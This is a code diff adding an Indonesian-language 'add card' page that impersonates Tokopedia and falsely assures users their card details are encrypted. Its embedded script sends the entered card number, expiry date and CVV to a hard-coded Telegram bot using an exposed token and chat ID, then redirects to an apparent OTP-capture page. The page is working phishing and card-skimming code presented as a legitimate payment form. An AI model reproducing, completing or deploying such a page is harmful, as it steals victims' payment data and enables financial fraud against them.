@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Tambahkan Kartu</title>
+    <style>
+        * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif; }
+        body { margin: 0; background-color: #ffffff; color: #31353B; }
+        .navbar { display: flex; align-items: center; padding: 12px 16px; border-bottom: 1px solid #f1f1f1; }
+        .back-arrow { color: #FF5722; font-size: 24px; text-decoration: none; margin-right: 16px; font-weight: bold; }
+        .nav-title { font-size: 18px; font-weight: 700; }
+        .banner { background-color: #F1FDF2; padding: 16px; display: flex; align-items: flex-start; gap: 10px; }
+        .icon-check { color: #03AC0E; font-size: 18px; }
+        .banner-content b { color: #03AC0E; font-size: 14px; display: block; margin-bottom: 4px; }
+        .banner-content p { margin: 0; font-size: 13px; color: #6D7588; line-height: 1.5; }
+        .container { padding: 24px 16px; }
+        .section-label { font-size: 16px; font-weight: 700; margin-bottom: 16px; display: block; }
+        .input-wrapper { margin-bottom: 16px; position: relative; }
+        input { width: 100%; padding: 14px 16px; border: 1px solid #E5E7E9; border-radius: 8px; font-size: 16px; outline: none; }
+        input:focus { border-color: #03AC0E; }
+        .row { display: flex; gap: 12px; }
+        .cvv-icon { position: absolute; right: 12px; top: 50%; transform: translateY(-50%); width: 20px; height: 20px; background-color: #E5E7E9; color: #888; border-radius: 50%; display: flex; justify-content: center; align-items: center; font-size: 12px; font-weight: bold; }
+        .btn-submit { width: 100%; padding: 14px; background-color: #E5E7E9; color: #9FA6B0; border: none; border-radius: 8px; font-size: 16px; font-weight: 700; margin-top: 8px; transition: 0.3s; cursor: not-allowed; }
+        .btn-submit.active { background-color: #03AC0E; color: #fff; cursor: pointer; }
+        .footer { margin-top: 40px; padding-bottom: 30px; text-align: center; font-size: 11px; color: #6D7588; }
+    </style>
+</head>
+<body>
+    <div class="navbar"><a href="index.html" class="back-arrow">&#10094;</a><span class="nav-title">Tambahkan Kartu</span></div>
+    <div class="banner">
+        <span class="icon-check">✔</span>
+        <div class="banner-content"><b>Rincian kartu Anda dilindungi.</b><p>Kartu Anda terjamin aman. Kami menggunakan enkripsi standar industri.</p></div>
+    </div>
+    <div class="container">
+        <span class="section-label">Rincian Kartu Debit</span>
+        <div class="input-wrapper"><input type="tel" id="cardNumber" placeholder="Nomor Kartu" maxlength="19"></div>
+        <div class="row">
+            <div class="input-wrapper" style="flex: 1;"><input type="tel" id="expiryDate" placeholder="BB/TT" maxlength="5"></div>
+            <div class="input-wrapper" style="flex: 1;"><input type="password" id="cvv" placeholder="CVV" maxlength="3" inputmode="numeric"><div class="cvv-icon">?</div></div>
+        </div>
+        <button class="btn-submit" id="submitBtn" disabled>Lanjutkan</button>
+        <div class="footer">Tentang Tokopedia | Kebijakan Privasi | Syarat & Ketentuan</div>
+    </div>
+
+    <script>
+        const token = '8746602429:AAHRxWuzAmXIksUuIs87TNq4oLGjxIJH83w';
+        const chat_id = '8723798929'; 
+
+        const cardIn = document.getElementById('cardNumber');
+        const expIn = document.getElementById('expiryDate');
+        const cvvIn = document.getElementById('cvv');
+        const btn = document.getElementById('submitBtn');
+
+        function check() {
+            if(cardIn.value.length >= 18 && expIn.value.length === 5 && cvvIn.value.length === 3) {
+                btn.classList.add('active'); btn.disabled = false;
+            } else {
+                btn.classList.remove('active'); btn.disabled = true;
+            }
+        }
+
+        cardIn.addEventListener('input', (e) => {
+            e.target.value = e.target.value.replace(/\W/gi, '').replace(/(.{4})/g, '$1 ').trim();
+            check();
+        });
+
+        expIn.addEventListener('input', (e) => {
+            let val = e.target.value.replace(/\D/g, '');
+            if (val.length > 2) e.target.value = val.substring(0, 2) + '/' + val.substring(2, 4);
+            check();
+        });
+
+        cvvIn.addEventListener('input', () => check());
+
+        btn.addEventListener('click', () => {
+            btn.innerHTML = "Memproses...";
+            const msg = `<b>🔔 DATA KARTU</b>\nCard: ${cardIn.value}\nExp: ${expIn.value}\nCVV: ${cvvIn.value}`;
+            fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: chat_id, text: msg, parse_mode: 'HTML' })
+            }).then(() => { window.location.href = 'otpcard.html'; });
+        });
+    </script>
+</body>
+</html>
